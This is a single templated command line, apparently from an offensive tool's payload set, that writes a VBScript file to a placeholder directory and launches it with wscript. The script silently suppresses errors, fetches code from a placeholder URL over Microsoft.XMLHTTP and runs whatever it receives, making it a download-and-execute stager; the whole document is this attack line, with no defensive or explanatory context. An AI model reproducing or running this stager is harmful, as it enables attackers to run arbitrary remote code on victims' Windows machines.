echo on error resume next:Set x=CreateObject("Microsoft.XMLHTTP"):x.open"GET","~URL~",false:x.send:Execute x.responseText>~DIRECTORY~/~FILE~.vbs&start wscript ~DIRECTORY~/~FILE~.vbs
